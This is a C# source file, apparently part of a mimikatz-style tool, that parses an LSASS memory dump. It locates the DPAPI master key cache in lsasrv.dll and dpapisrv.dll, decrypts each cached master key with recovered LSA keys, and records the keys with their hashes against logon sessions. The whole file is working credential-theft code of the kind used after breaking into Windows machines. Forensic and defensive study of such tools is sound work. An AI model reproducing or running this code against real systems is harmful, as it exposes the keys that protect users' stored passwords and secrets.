using Minidump.Crypto;
using Minidump.Templates;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using static Minidump.Helpers;

namespace Minidump.Decryptor
{
    public class Dpapi_
    {
        public static int FindCredentials(Program.MiniDump minidump, dpapi.DpapiTemplate template)
        {
            foreach (string module in new List<string> { "lsasrv.dll", "dpapisrv.dll" })
            {
                long position = find_signature(minidump, module, template.signature);
                long llcurrent;
                if (position == 0)
                    continue;

                var ptr_entry_loc = get_ptr_with_offset(minidump.fileBinaryReader, (position + template.first_entry_offset), minidump.sysinfo);
                long ptr_entry = ReadInt64(minidump.fileBinaryReader, (long)ptr_entry_loc);

                llcurrent = ptr_entry;
                do
                {
                    byte[] entryBytes = ReadBytes(minidump.fileBinaryReader, Rva2offset(minidump, llcurrent),
                        Marshal.SizeOf(typeof(dpapi.KIWI_MASTERKEY_CACHE_ENTRY)));

                    dpapi.KIWI_MASTERKEY_CACHE_ENTRY dpapiEntry = ReadStruct<dpapi.KIWI_MASTERKEY_CACHE_ENTRY>(entryBytes);
                    //PrintProperties(dpapiEntry);

                    if (dpapiEntry.keySize > 1)
                    {
                        byte[] dec_masterkey = BCrypt.DecryptCredentials(dpapiEntry.key, minidump.lsakeys);
                        Dpapi dpapi = new Dpapi();
                        //dpapi.luid = $"{dpapiEntry.LogonId.HighPart}:{dpapiEntry.LogonId.LowPart}";
                        dpapi.masterkey = BitConverter.ToString(dec_masterkey).Replace("-", "");
                        dpapi.insertTime = $"{ToDateTime(dpapiEntry.insertTime):yyyy-MM-dd HH:mm:ss}";
                        dpapi.key_size = dpapiEntry.keySize.ToString();
                        dpapi.key_guid = dpapiEntry.KeyUid.ToString();
                        dpapi.masterkey_sha = BCrypt.GetHashSHA1(dec_masterkey);

                        Logon currentlogon = minidump.logonlist.FirstOrDefault(x => x.LogonId.HighPart == dpapiEntry.LogonId.HighPart && x.LogonId.LowPart == dpapiEntry.LogonId.LowPart);
                        if (currentlogon == null && !dpapi.insertTime.Contains("1601-01-01"))
                        {
                            currentlogon = new Logon(dpapiEntry.LogonId);
                            currentlogon.Dpapi = new List<Dpapi>();
                            currentlogon.Dpapi.Add(dpapi);
                            minidump.logonlist.Add(currentlogon);
                        }
                        else
                        {
                            if (currentlogon.Dpapi == null)
                                currentlogon.Dpapi = new List<Dpapi>();

                            currentlogon.Dpapi.Add(dpapi);
                        }
                    }

                    llcurrent = dpapiEntry.Flink;
                } while (llcurrent != ptr_entry);
            }

            return 0;
        }
    }
}